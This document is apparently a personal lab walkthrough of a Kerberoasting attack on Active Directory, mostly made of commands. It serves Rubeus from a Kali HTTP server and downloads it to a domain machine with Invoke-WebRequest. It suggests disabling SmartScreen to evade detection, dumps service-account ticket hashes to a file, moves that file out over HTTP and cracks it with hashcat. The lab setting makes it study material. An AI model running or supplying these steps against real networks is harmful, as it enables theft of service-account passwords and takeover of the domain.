## Kerberoasting ##

The attack's chain:

1. Request a ticket - as any domain user (Sima), ask the KDC for a service ticket for svc-sql's SPN. This is a normal, allowed Kerberos action, doesn't need any special rights.

2. Extract the ticket - that ticket sitting in memory is encrypted using svc-sql's password hash (remember: Kerberos tickets are encrypted with the target account's hash, we covered this).

3. Take it offline - copy the ticket data out.

4. Crack it offline - throw it at a tool like Hashcat, try to brute-force/dictionary-crack the hash back into the plaintext password.

5. If cracked - you now know svc-sql's real password, and can log in AS that account. If svc-sql had bad permissions (like Domain Admin), game over for the whole domain.

# Step one: #
Type this command in the attacker's terminal to request a ticket from the service you want to preform the attack on:

```bash
klist get [YOURSERVICE]/[YOUR SERVICE NAME].[YOUR DOMAIN NAME]:[YOUR SEVICE PORT]
```

now look at the response from your service, and see the encryption type of the service's password. for me it looks like this: 

Server: MSSQLSvc/sql-server.ad-lab.local:1433 @ AD-LAB.LOCAL
KerbTicket Encryption Type: RSADSI RC4-HMAC(NT) <-- encryption type

after you requested the ticket and successfuly got it then you can move on to the next step.

# Step two: #
use a tool called "Rubeus" that will do everything for us:
He is going to get the hash of the service's password and put it into a file that we can immediatly put into hashcat in attempt to crack the services password. 

Download it from github or if you are on Kali Linux than navigate to this folder: 

┌──(kali㉿kali)-[~]
└─$ cd /usr/share/windows-resources/rubeus/

And make a python http server to share files localy:

┌──(kali㉿kali)-[/usr/share/windows-resources/rubeus]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

Now go bask to the low privalege domain account and browse to the kali http server.
once there- attempt to turn smart screen off or use powershell to avoid any malware detection:

```bash
Invoke-WebRequest -Uri "http://192.168.56.104:8000/Rubeus.exe" -OutFile "C:\Users\Sima Arusi\Desktop\Rubeus.exe"
```

once you get the .exe file attempt to directly run it, else run it from powershell:
```bash
.\Rubeus.exe
```

if there are no errors just usage instructions then the tool is ready for usage.

to run rubeus type:

```bash
rubeus.exe keberoast /outfile:hashes.txt
```

after it finishes, you need to pass that file to your kali machine or any machine that has hashcat installed on it, to pass the file to your kali machine simply navigate to the hashes.txt folder and host a python http server:

```bash
python3 -m http.server 8000
```

from kali, browse to that URL, get the hashes.txt file and crack it with hashcat:

```bash
hashcat -m 13100 hashes.txt truepassword.txt 
```

after hashcat successfuly cracks the hash and gets the password, you successfuly managed to preform a Kerberoasting attack.
URIA NARKIS>3xd